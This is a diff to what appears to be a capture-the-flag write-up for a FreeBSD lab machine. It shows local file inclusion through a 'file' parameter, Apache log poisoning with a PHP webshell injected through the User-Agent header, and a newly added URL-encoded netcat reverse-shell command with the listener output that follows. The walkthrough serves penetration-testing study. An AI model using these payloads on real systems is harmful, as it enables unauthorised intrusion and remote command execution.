@@ -196,7 +196,7 @@ uid=1001(charix) gid=1001(charix) groups=1001(charix)
 
 <br />
 
-If we take a closer look at the URL that gave us access to the `base64-encoded` password, there can be a good place to test a LFI (Local File Inclusion).
+If we take a closer look at the URL that gave us access to the base64-encoded password, it appears to be a good candidate for testing LFI (Local File Inclusion).
 
 <br />
 
@@ -206,9 +206,9 @@ http://10.10.10.84/browse.php?file=pwdbackup.txt
 
 <br />
 
-It has a `"file"` parameter that we can try to use to include other critical files.
+It contains a `"file"` parameter that we can try to exploit to include other critical files.
 
-Let's try it with `/etc/passwd`
+Let's try it with `/etc/passwd`.
 
 <br />
 
@@ -219,7 +219,7 @@ view-source:http://10.10.10.84/browse.php?file=/etc/passwd
 
 <br />
 
-We successfully retrieve its contents.
+We are able to successfully retrieve its contents.
 
 <br / >
 
@@ -227,9 +227,9 @@ We successfully retrieve its contents.
 
 <br />
 
-`Log Poisoning` is a hacking technique that allows us to turn a simple `LFI` into an `RCE`. 
+`Log Poisoning` is a technique that allows us to escalate a simple `LFI` into an `RCE`. 
 
-By manipulating `log` files, attackers can attempt to `execute commands` on the target machine. The scripting language used depends on the website's tech stack. In this case, we need to use `PHP`.
+By manipulating `log` files, an attacker can attempt to execute commands on the target machine. The scripting language used depends on the website's tech stack. In this case it's PHP.
 
 We will exploit this step by step:
 
@@ -239,9 +239,9 @@ We will exploit this step by step:
 
 <br />
 
-We're dealing with a `FreeBSD` system, so the default `Apache` log file path is `/var/log/httpd-access.log`.
+Since we're dealing with a `FreeBSD` system, the default `Apache` log file path is `/var/log/httpd-access.log`.
 
-We can confirm it with the LFI:
+We can confirm this using the LFI vulnerability:
 
 <br />
 
@@ -266,7 +266,7 @@ This is the PHP code that we'll use for the webshell:
 
 <br />
 
-Now, we can make the request:
+Next, we send the request:
 
 <br />
 
@@ -280,7 +280,7 @@ curl -s -X GET "http://10.10.10.84/" -H 'User-Agent: <?php system($_GET[100]); ?
 
 <br />
 
-Finally, we include the `httpd-access.log` file to execute our PHP code and trigger the webshell:
+Finally, we include the `httpd-access.log` file to execute our injected PHP code and trigger the webshell:
 
 <br />
 
@@ -292,7 +292,33 @@ view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&100=id
 
 <br />
 
-### 4 - Trigger a reverse shell
+### 4 - Reverse shell
 
 <br />
 
+At this point, we can trigger a reverse shell:
+
+<br />
+
+```bash
+view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&100=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%20443%20%3E%2Ftmp%2Ff
+```
+
+<br />
+
+If we check our listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.84 37835
+sh: can't access tty; job control turned off
+$ id    
+uid=80(www) gid=80(www) groups=80(www)
+```
+
+<br />
+
+We now have a shell as the `www` user.
